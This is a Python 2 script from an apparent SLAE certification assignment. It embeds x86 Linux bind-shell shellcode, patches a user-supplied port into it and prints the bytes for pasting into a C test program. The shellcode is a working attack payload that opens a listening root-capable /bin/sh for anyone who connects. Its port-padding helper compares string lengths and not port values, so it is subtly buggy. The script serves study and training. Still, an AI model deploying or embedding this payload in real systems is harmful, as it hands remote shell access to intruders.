import sys
import struct
import binascii
#Author: Aaron Weathersby
#SLAE #1488
#Handle: t0b0x0r
#github:https://github.com/t0b0rX0r/slae/upload/master/assignment1
#Assignment #1- Bind Shell
#created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

def checkport(port):

	if len(port) < 10:
		print "Port less than 10"
		port='0x' + port[2:].zfill(4)
		print "Padded: "+port
		#sys.exit()
	elif len(port) < 100:
		print "Port less than 100"
		port='0x' + port[2:].zfill(2)
		print "Padded: "+port
		#sys.exit()
	elif len(port) < 1000:
		print "Port less than 1000"
		port='0x' + port[2:].zfill(1)
		print "Padded: "+port
		#sys.exit()
	return port

def main():
	encoded=""
	total = len(sys.argv)
	port=""

	if total != 2:
		print "Usage: python slae_assignment_1.py [port]"
	else:
		port = sys.argv[1]
		print "Port: "+port
	
		port = hex(int(port)) 
		print "Port in Hex: "+port
		#Pad port incase its less than 4 Digits
		port=checkport(port)
	

		port_Bendian=port[0]+""+port[1]+port[4]+port[5]+port[2]+port[3]
	
		be1="\\x"+port_Bendian[2]+port_Bendian[3]
		be2="\\x"+port_Bendian[4]+port_Bendian[5]
		print "Big Endian: "+be1 +be2
		shell=("\x31\xc0\xb0\x66\xb3\x01\x31\xd2\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x02\x52\x66\x68"+"\x99"+"\x66\x6a\x02\x89\xe1\x6a\x10\x51\x89\xf7\x56\x89\xe1\xcd\x80\x89\xfe\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x56\x89\xe1\xcd\x80\x88\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x04\x75\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xb0\x0b\xcd\x80")
		
		for x in bytearray(shell):
			
			#print "Encoded: "+'\\x%02x'%x#+" X: "+str(x)
			#print "\\x99 ="+ str(bytearray("\\x99"))
			y='\\x%02x'%x
			if y==str(bytearray("\\x99")):
				#print "FOund"
			
				encoded+=be2+be1
			else:
				encoded+='\\x'
				encoded+='%02x' % x
		print "Paste this into Shellcode.c"
		print '"'+encoded+'";'
		

if __name__== "__main__":
  main()
